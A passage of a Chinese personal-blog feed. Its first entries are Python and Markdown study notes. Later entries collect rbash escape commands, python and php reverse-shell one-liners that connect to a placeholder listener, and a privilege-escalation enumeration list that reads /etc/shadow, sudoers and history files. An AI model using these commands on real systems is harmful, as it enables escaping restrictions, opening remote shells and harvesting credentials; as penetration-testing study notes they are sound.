&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;・遵守一定的命名规范。&lt;br&gt;・驼峰命名法，又分为大驼峰命名法和小驼峰命名法。&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/python%E5%8F%98%E9%87%8F%E5%92%8C%E8%BE%93%E5%87%BA%E8%BE%93%E5%85%A5/4.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;小驼峰式命名法（lower camel case）： 第一个单词以小写字母开始；第二个单词的首字母大写，例如：myName、aDog&lt;br&gt;大驼峰式命名法（upper camel case）： 每一个单字的首字母都采用大写字母，例如：FirstName、LastName.&lt;/p&gt;&lt;p&gt;还有一种命名法是用下划线 “_” 来连接所有的单词，比如 send_buf. Python 的命令规则遵循 PEP8 标准：&lt;br&gt;&lt;code&gt;变量名，函数名和文件名全小写，使用下划线连接； 类名遵守大驼峰命名法； 常量名全大写；&lt;/code&gt;&lt;/p&gt;&lt;h3 id=&#34;关键字-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关键字-2&#34;&gt;#&lt;/a&gt; 关键字&lt;/h3&gt;&lt;p&gt;关键字的概念 一些具有特殊功能的标识符，这就是所谓的关键字。 关键字，已经被 python 官方使用了，所以不允许开发者自己定义和关键字相同名字的标识符。&lt;br&gt;关键字:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;False     None    True   and      as       assert   break     class  
continue  def     del    elif     else     except   finally   for
from      global  if     import   in       is       lambda    nonlocal
not       or      pass   raise    return   try      while     with  
yield
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;输出语句&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#输出语句&#34;&gt;#&lt;/a&gt; 输出语句&lt;/h2&gt;&lt;p&gt;简单来说，就是将程序的运行结果显示出来。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;print(&#39;hello world&#39;)
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;格式化输出&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#格式化输出&#34;&gt;#&lt;/a&gt; 格式化输出&lt;/h3&gt;&lt;p&gt;格式化操作的目的&lt;br&gt;比如有以下代码:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;pirnt(&amp;quot;我今年10岁&amp;quot;)
pirnt(&amp;quot;我今年11岁&amp;quot;)
pirnt(&amp;quot;我今年12岁&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;想一想:&lt;br&gt;在输出年龄的时候，用了多次 &amp;quot;我今年 xx 岁&amp;quot;，能否简化一下程序呢？？？&lt;/p&gt;&lt;p&gt;答:&lt;br&gt;字符串格式化&lt;/p&gt;&lt;p&gt;什么是格式化&lt;br&gt;看如下代码:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;age = 10
print(&amp;quot;我今年%d岁&amp;quot; % age)

age += 1
print(&amp;quot;我今年%d岁&amp;quot; % age)

age += 1
print(&amp;quot;我今年%d岁&amp;quot; % age)
Copy
在程序中，看到了%这样的操作符，这就是Python中格式化输出。

age = 18
name = &amp;quot;xiaohua&amp;quot;
print(&amp;quot;我的姓名是%s, 年龄是%d&amp;quot; % (name, age))

&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;常用的格式符号&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用的格式符号&#34;&gt;#&lt;/a&gt; 常用的格式符号&lt;/h3&gt;&lt;p&gt;下面是完整的，它可以与％符号使用列表:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;格式符号	  转换
%%	  输出 % 号
%s	  字符串
%d	  有符号十进制整数
%f	  浮点数
%c	  字符
%u	  无符号十进制整数
%o	  八进制整数
%x	  十六进制整数（小写字母0x）
%X	  十六进制整数（大写字母0X）
%e	  科学计数法（小写&#39;e&#39;）
%E	  科学计数法（大写“E”）
%g	  ％f和％e 的简写
%G	  ％f和％E的简写
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;换行输出&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#换行输出&#34;&gt;#&lt;/a&gt; 换行输出&lt;/h3&gt;&lt;p&gt;在输出的时候，如果有 \n 那么，此时 \n 后的内容会在另外一行显示。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;print(&amp;quot;1234567890-------&amp;quot;) # 会在一行显示
print(&amp;quot;1234567890\n-------&amp;quot;) # 一行显示1234567890，另外一行显示-------
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;python2与python3里的区别&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python2与python3里的区别&#34;&gt;#&lt;/a&gt; python2 与 python3 里的区别&lt;/h3&gt;&lt;p&gt;在 python3 里，print 只能使用函数的方式来调用，而在 python2 里，print 可以当做一个命令来使用。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;print(&amp;quot;hello world&amp;quot;)   # 在python2和python3里都可以使用
print &amp;quot;hello world&amp;quot;  # 这种写法只能在python2里使用，python3不再支持这种写法
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;输入语句&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#输入语句&#34;&gt;#&lt;/a&gt; 输入语句&lt;/h2&gt;&lt;p&gt;咱们在银行 ATM 机器前取钱时，肯定需要输入密码，那么怎样才能让程序知道咱们刚刚输入的是什么呢？？ 大家应该知道了，如果要完成 ATM 机取钱这件事情，需要读取用户的输入，并且使用变量保存用户输入的数据。在 Python 中，我们可以使用 input () 函数来获取用户的输入。&lt;/p&gt;&lt;p&gt;input&lt;br&gt;在 Python 中，获取键盘输入的数据的方法是采用 input 函数（至于什么是函数，咱们以后的章节中讲解），那么这个 input 怎么用呢？&lt;/p&gt;&lt;p&gt;看如下示例:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;password = input(&amp;quot;请输入密码:&amp;quot;)
print(&#39;您刚刚输入的密码是:%s&#39; % password)
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;注意&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注意&#34;&gt;#&lt;/a&gt; 注意:&lt;/h3&gt;&lt;p&gt;input () 的小括号中放入的是提示信息，用来在获取数据之前给用户的一个简单提示&lt;br&gt;input () 在从键盘获取了数据以后，会存放到等号右边的变量中&lt;br&gt;input () 会把用户输入的任何值都作为字符串来对待&lt;/p&gt;&lt;h3 id=&#34;python2和python3区别&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python2和python3区别&#34;&gt;#&lt;/a&gt; python2 和 python3 区别&lt;/h3&gt;&lt;p&gt;在 python2 里，如果使用 input 语句，用户输入的内容如果是一个字符串，会把这个字符串当做一个变量使用；如果输入输入的是一个数字，会把这个数字当做数字类型。如果想要输入一个字符串，需要给这个字符串加引号，或者使用 raw_input.&lt;/p&gt;&lt;p&gt;在 python3 里，用户输入的所有内容都会被当做字符串来存储。python3 里的 input 功能和 python2 里的 raw_input 功能一致。&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="Python语言学习" scheme="http://avenue.cool/categories/Python/" />
        <category term="Python语言学习" scheme="http://avenue.cool/tags/Python%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" />
        <updated>2021-02-03T14:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/Python/Pyhton%E4%B8%AD%E7%9A%84%E6%B3%A8%E9%87%8A/</id>
        <title>2.Python中的注释</title>
        <link rel="alternate" href="http://avenue.cool/Python/Pyhton%E4%B8%AD%E7%9A%84%E6%B3%A8%E9%87%8A/"/>
        <content type="html">&lt;!-- build time:Sun Feb 07 2021 00:32:46 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h2 id=&#34;注释&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注释&#34;&gt;#&lt;/a&gt; 注释&lt;/h2&gt;&lt;p&gt;在我们工作编码的过程中，如果一段代码的逻辑比较复杂，不是特别容易理解，可以适当的添加注释，以辅助自己或者其他编码人员解读代码。&lt;/p&gt;&lt;p&gt;注意：注释是给程序员看的，为了让程序员方便阅读代码，解释器会忽略注释。使用自己熟悉的语言，适当的对代码进行注释说明是一种良好的编码习惯。&lt;/p&gt;&lt;h2 id=&#34;注释的分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注释的分类&#34;&gt;#&lt;/a&gt; 注释的分类&lt;/h2&gt;&lt;p&gt;在 Python 中支持单行注释和多行注释。&lt;/p&gt;&lt;h3 id=&#34;单行注释&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#单行注释&#34;&gt;#&lt;/a&gt; 单行注释&lt;/h3&gt;&lt;p&gt;以 #开头，# 右边的所有东西当做说明，而不是真正要执行的程序，起辅助说明作用。&lt;br&gt;# 开头右边的都是注释，解析器会忽略注释&lt;/p&gt;&lt;p&gt;print (&#39;hello world&#39;) #我的作用是在控制台输出 hello world&lt;/p&gt;&lt;h3 id=&#34;多行注释&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#多行注释&#34;&gt;#&lt;/a&gt; 多行注释&lt;/h3&gt;&lt;p&gt;以 &#39;&#39;&#39; 开始，并以 &#39;&#39;&#39; 结束，我们称之为多行注释。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;                               _ooOoo_
                              o8888888o
                              88&amp;quot; . &amp;quot;88
                              (| -_- |)
                              O\  =  /O
                           ____/`---&#39;\____
                         .&#39;  \\|     |//  `.
                        /  \\|||  :  |||//  \
                       /  _||||| -:- |||||-  \
                       |   | \\\  -  /// |   |
                       | \_|  &#39;&#39;\---/&#39;&#39;  |   |
                       \  .-\__  `-`  ___/-. /
                     ___`. .&#39;  /--.--\  `. . __
                  .&amp;quot;&amp;quot; &#39;&amp;lt;  `.___\_&amp;lt;|&amp;gt;_/___.&#39;  &amp;gt;&#39;&amp;quot;&amp;quot;.
                 | | :  `- \`.;`\ _ /`;.`/ - ` : | |
                 \  \ `-.   \_ __\ /__ _/   .-` /  /
            ======`-.____`-.___\_____/___.-`____.-&#39;======
                               `=---=&#39;
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                       佛祖保佑        永无BUG
              佛曰:
                     写字楼里写字间，写字间里程序员；
                     程序人员写程序，又拿程序换酒钱。
                     酒醒只在网上坐，酒醉还来网下眠；
                     酒醉酒醒日复日，网上网下年复年。
                     但愿老死电脑间，不愿鞠躬老板前；
                     奔驰宝马贵者趣，公交自行程序员。
                     别人笑我忒疯癫，我笑自己命太贱；
                     不见满街漂亮妹，哪个归得程序员？
&lt;/code&gt;&lt;/pre&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="Python语言学习" scheme="http://avenue.cool/categories/Python/" />
        <category term="Python语言学习" scheme="http://avenue.cool/tags/Python%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" />
        <updated>2021-02-03T14:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/Python/mkardown%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</id>
        <title>mkardown 基础语法</title>
        <link rel="alternate" href="http://avenue.cool/Python/mkardown%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"/>
        <content type="html">&lt;!-- build time:Sun Feb 07 2021 00:32:46 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h2 id=&#34;无序列表使用-加号-空格的形式来表示&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#无序列表使用-加号-空格的形式来表示&#34;&gt;#&lt;/a&gt; 无序列表使用 加号 + 空格的形式来表示。&lt;/h2&gt;&lt;p&gt;・咖啡&lt;br&gt;・啤酒&lt;br&gt;・矿泉水&lt;br&gt;・白酒&lt;br&gt;・葡萄酒&lt;br&gt;・香槟酒&lt;/p&gt;&lt;h2 id=&#34;每天要做的事情有序列表&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#每天要做的事情有序列表&#34;&gt;#&lt;/a&gt; 每天要做的事情：有序列表&lt;/h2&gt;&lt;ol&gt;&lt;li&gt;起床&lt;/li&gt;&lt;li&gt;穿衣服&lt;/li&gt;&lt;li&gt;一脸刷牙&lt;/li&gt;&lt;li&gt;出门开车&lt;/li&gt;&lt;li&gt;到公司上班&lt;/li&gt;&lt;/ol&gt;&lt;h2 id=&#34;使用标题&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用标题&#34;&gt;#&lt;/a&gt; 使用标题&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;# 我是一级标题
## 我是二级标题
### 三级标题
#### 四级标题
###### 六级标题
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;加粗显示字体&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#加粗显示字体&#34;&gt;#&lt;/a&gt; 加粗显示字体&lt;/h2&gt;&lt;p&gt;使用两个 ** 号结束和开始&lt;br&gt;&lt;code&gt;我是一个**很帅很帅**的帅哥。&lt;/code&gt;&lt;/p&gt;&lt;h2 id=&#34;字体倾斜&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#字体倾斜&#34;&gt;#&lt;/a&gt; 字体倾斜：&lt;/h2&gt;&lt;p&gt;一个 * 结束和开始&lt;/p&gt;&lt;h2 id=&#34;加粗和倾斜&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#加粗和倾斜&#34;&gt;#&lt;/a&gt; 加粗和倾斜：&lt;/h2&gt;&lt;p&gt;使用三个 *** 号开始和结束&lt;/p&gt;&lt;h2 id=&#34;超链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#超链接&#34;&gt;#&lt;/a&gt; 超链接：&lt;/h2&gt;&lt;p&gt;[name](地址）&lt;br&gt;&lt;code&gt;[百度](https://www.baidu.com)&lt;/code&gt;&lt;/p&gt;&lt;h2 id=&#34;文字说明&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文字说明&#34;&gt;#&lt;/a&gt; 文字说明： &amp;gt;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;&amp;gt; 我是一段文字说明。
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;插入图片&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#插入图片&#34;&gt;#&lt;/a&gt; 插入图片&lt;/h2&gt;&lt;p&gt;![] +（图片目录 / 图片名称)&lt;br&gt;&lt;code&gt;![](imgs/软件系统.png)&lt;/code&gt;&lt;/p&gt;&lt;h2 id=&#34;代码书写&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#代码书写&#34;&gt;#&lt;/a&gt; 代码书写&lt;/h2&gt;&lt;p&gt;三个反引号 &lt;code&gt;&lt;/code&gt; 开始和结束&lt;/p&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;hello world&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;不让解析的话一个反引号开始和结尾&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#不让解析的话一个反引号开始和结尾&#34;&gt;#&lt;/a&gt; 不让解析的话：一个反引号开始和结尾&lt;/h2&gt;&lt;p&gt;使用 &lt;code&gt;*开始，*&lt;/code&gt; 结束，可以让字体倾斜。&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="Python语言学习" scheme="http://avenue.cool/categories/Python/" />
        <category term="Python语言学习" scheme="http://avenue.cool/tags/Python%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" />
        <updated>2021-02-03T14:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/Increase-authority/linux%20%20rbash%E7%BB%95%E8%BF%87/</id>
        <title>linux  rbash绕过</title>
        <link rel="alternate" href="http://avenue.cool/Increase-authority/linux%20%20rbash%E7%BB%95%E8%BF%87/"/>
        <content type="html">&lt;!-- build time:Sun Feb 07 2021 00:32:46 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h1 id=&#34;什么是rbash&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#什么是rbash&#34;&gt;#&lt;/a&gt; 什么是 rbash？&lt;/h1&gt;&lt;p&gt;受限 shell 是 LinuxShell 限制一些 bash shell 中的功能，并且是从名字上很清楚。 该限制很好地实现了命令以及脚本在受限 shell 中运行。 它为 Linux 中的 bash shell 提供了一个额外的安全层。&lt;/p&gt;&lt;p&gt;但以下情况是不允许 rbash 执行的：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;使用命令 cd 更改目录&lt;/li&gt;&lt;li&gt;设置或者取消环境变量的设置（SHELL, PATH, ENV, or BASH_ENV）&lt;/li&gt;&lt;li&gt;指定包含参数 &#39;/&#39; 的文件名&lt;/li&gt;&lt;li&gt;指定包含参数 &#39; - &#39; 的文件名&lt;/li&gt;&lt;li&gt;使用重定向输出 &#39;&amp;gt;&#39;, &#39;&amp;gt;&amp;gt;&#39;, &#39;&amp;gt; |&#39;, &#39;&amp;lt;&amp;gt;&#39; &#39;&amp;gt;&amp;amp;&#39;,&#39;&amp;amp;&amp;gt;&#39;&lt;/li&gt;&lt;li&gt;大致的限制如上&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;那么我们如果在实际环境中，如果想要对环境进行进一步的操作，那么 rbash 肯定是不符合要求的，所以才有了 “绕过” 这一行为&lt;br&gt;而因为 rbash 的特殊性问题，绕过的方法，大多都是通过 Linux 机器上现有的软件，来执行一个没有限制的 shell 回来使用&lt;/p&gt;&lt;p&gt;创建限制 shell 的用户&lt;br&gt;在 RHEL 和 Centos 的系统中，rbash 不能直接实现，所以在开始之前，我们需要通过 ln-s 来建立一个软连接&lt;/p&gt;&lt;pre&gt;&lt;code&gt;cd  /bin
ln -s bash rbash
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后创建用户的时候，在设置用户是以 /bin/rbash 来启动的 shell&lt;/p&gt;&lt;p&gt;&lt;code&gt;useradd -s /bin/rbash hack&lt;/code&gt;&lt;/p&gt;&lt;h1 id=&#34;rbash-绕过方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rbash-绕过方法&#34;&gt;#&lt;/a&gt; rbash 绕过方法&lt;/h1&gt;&lt;h2 id=&#34;bash_cmdsabinsha-把binbash给a变量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bash_cmdsabinsha-把binbash给a变量&#34;&gt;#&lt;/a&gt; BASH_CMDS [a]=/bin/sh;a #把 /bin/bash 给 a 变量&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;/bin/bash                  
echo $0   #查看脚本本身的名字
echo $?    #命令执行结果反馈，0代表执行成功，其余数字表示不成功
export PATH=$PATH:/bin/    #将/bin 作为PATH环境变量导出
export PATH=$PATH:/usr/bin   #将/usr/bin作为PATH环境变量导出
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行完上面加粗的四步之后就可以执行所有命令了&lt;/p&gt;&lt;h2 id=&#34;vi-命令可以使用可以使用vi-获取到一个-bash&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#vi-命令可以使用可以使用vi-获取到一个-bash&#34;&gt;#&lt;/a&gt; vi 命令可以使用，可以使用 vi 获取到一个 bash&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;vim  test
Press ESC key
:set shell=/bin/sh
:shell
export PATH=/usr/sbin:/usr/bin:/sbin:/bin  添加全局环境变量
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;PATH 就是定义 /bin:/sbin:/usr/bin 等这些路径的变量，其中冒号为目录间的分割符。&lt;/p&gt;&lt;h2 id=&#34;使用python-突破shell-限制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用python-突破shell-限制&#34;&gt;#&lt;/a&gt; 使用 python 突破 shell 限制&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;python -c &amp;quot;import os;os.system(&#39;whoami&#39;)&amp;quot;
python -c &amp;quot;import os;os.system(&#39;/bin/sh&#39;)&amp;quot;
python -c &amp;quot;import pty;pty.spawn(&#39;/bin/sh&#39;)&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;ed-编辑器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ed-编辑器&#34;&gt;#&lt;/a&gt; ED - 编辑器&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;ed
! &#39;/bin/sh&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;perl&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#perl&#34;&gt;#&lt;/a&gt; Perl&lt;/h2&gt;&lt;p&gt;&lt;code&gt;perl -e &#39;system(&amp;quot;/bin/sh&amp;quot;);&#39;&lt;/code&gt;&lt;/p&gt;&lt;h2 id=&#34;通过ssh绕过rbash&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#通过ssh绕过rbash&#34;&gt;#&lt;/a&gt; 通过 SSH 绕过 rbash&lt;/h2&gt;&lt;p&gt;如果您知道属于 rbash shell 的用户的 ssh 凭据，则可以在 ssh 上使用以下命令来破解监狱，并通过访问适当的 bash shell 绕过 rbash。&lt;br&gt;&lt;code&gt;ssh ignite@192.168.1.103 -t &amp;quot;bash --noprofile&amp;quot;&lt;/code&gt;&lt;/p&gt;&lt;h2 id=&#34;使用expect绕过rbash&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用expect绕过rbash&#34;&gt;#&lt;/a&gt; 使用 Expect 绕过 rbash&lt;/h2&gt;&lt;p&gt;Expect 是一个 Unix 程序，可以根据脚本与其他交互式程序 “对话”。在脚本之后，Expect 知道程序可以期望什么，正确的响应应该是什么。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;expect
spwan sh
sh
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;man-绕过rbash&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#man-绕过rbash&#34;&gt;#&lt;/a&gt; man 绕过 rbash&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;man man
!&#39;sh&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;通过反向shell绕过rbash&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#通过反向shell绕过rbash&#34;&gt;#&lt;/a&gt; 通过反向 Shell 绕过 rbash&lt;/h2&gt;&lt;p&gt;您也可以选择反向 shellcode 绕过 rbash，这里我们使用 python 反向 shellcode（penetestmokey），这会将 “sh：Bourne shell” 扔到正在监听的 netcat 上的监听机器（在本例中为 Kali Linux）我们的 Kali Linux。&lt;br&gt;&lt;code&gt;nc -lvp 1234&lt;/code&gt;&lt;br&gt;运行侦听器后，我们将运行以下命令。&lt;br&gt;&lt;code&gt;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;LISTENING IP&amp;quot;,LISTENING PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;&lt;/code&gt;&lt;/p&gt;&lt;pre&gt;&lt;code&gt;php -r &#39;$sock=fsockopen(&amp;quot;LISTENING IP&amp;quot;,LISTENING PORT);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="提权知识" scheme="http://avenue.cool/categories/Increase-authority/" />
        <category term="提权知识" scheme="http://avenue.cool/tags/%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86/" />
        <updated>2021-02-02T14:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/Increase-authority/Linux%E6%8F%90%E6%9D%83%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/</id>
        <title>Linux提权相关命令</title>
        <link rel="alternate" href="http://avenue.cool/Increase-authority/Linux%E6%8F%90%E6%9D%83%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"/>
        <content type="html">&lt;!-- build time:Sun Feb 07 2021 00:32:46 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h2 id=&#34;获取系统信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#获取系统信息&#34;&gt;#&lt;/a&gt; 获取系统信息&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;cat /etc/issue   查看发行版 
cat /etc/*-release   查看发行版
cat /proc/version uname -a   查看内核版本
rpm -q kernel   红帽系统特有 
dmesg | grep Linux
ls /boot | grep vmlinuz- 
lsb_release -a
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;检查用户权限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#检查用户权限&#34;&gt;#&lt;/a&gt; 检查用户权限&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo -l 
cat /etc/sudoers 
whoami
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;检查密码文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#检查密码文件&#34;&gt;#&lt;/a&gt; 检查密码文件&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;cat /etc/passwd
cat /etc/shadow
ls -l /etc/passwd
ls -l /etc/shadow
passwd文件中存储了用户，shadow文件中存储的是密码的hash。出于安全的考虑，passwd是全用户可读，root可写的。而Shadow是仅root可读写的。
passwd由冒号分割，第一列是用户名，第二列是密码，x代表密码hash被放在shadow里面了（这样非root就看不到了）。
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;查看环境变量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看环境变量&#34;&gt;#&lt;/a&gt; 查看环境变量&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;搜寻有配置错误的环境变量，查看是否优先从不安全的路径执行文件。
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
cat ~/.bash_history
env
set
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;检查历史文件及命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#检查历史文件及命令&#34;&gt;#&lt;/a&gt; 检查历史文件及命令&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;cat ~/.*_history
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;搜寻可被低权限用户使用的root权限程序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#搜寻可被低权限用户使用的root权限程序&#34;&gt;#&lt;/a&gt; 搜寻可被低权限用户使用的 root 权限程序&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;检查以root权限的进程是否存在漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#检查以root权限的进程是否存在漏洞&#34;&gt;#&lt;/a&gt; 检查以 root 权限的进程是否存在漏洞&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;ps aux | grep root
ps -ef | grep root
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;搜索纯文本凭据的文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#搜索纯文本凭据的文件&#34;&gt;#&lt;/a&gt; 搜索纯文本凭据的文件&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;grep -ir user *
grep -ir pass *
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;查找可写的配置文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查找可写的配置文件&#34;&gt;#&lt;/a&gt; 查找可写的配置文件&lt;/h2&gt;&lt;p&gt;&lt;code&gt;find /etc/ -writable -type f 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="提权知识" scheme="http://avenue.cool/categories/Increase-authority/" />
        <category term="提权知识" scheme="http://avenue.cool/tags/%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86/" />
        <updated>2021-02-02T14:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/Increase-authority/linux%20%20git%20%E6%8F%90%E6%9D%83/</id>
        <title>linux  git 提权</title>
        <link rel="alternate" href="http://avenue.cool/Increase-authority/linux%20%20git%20%E6%8F%90%E6%9D%83/"/>
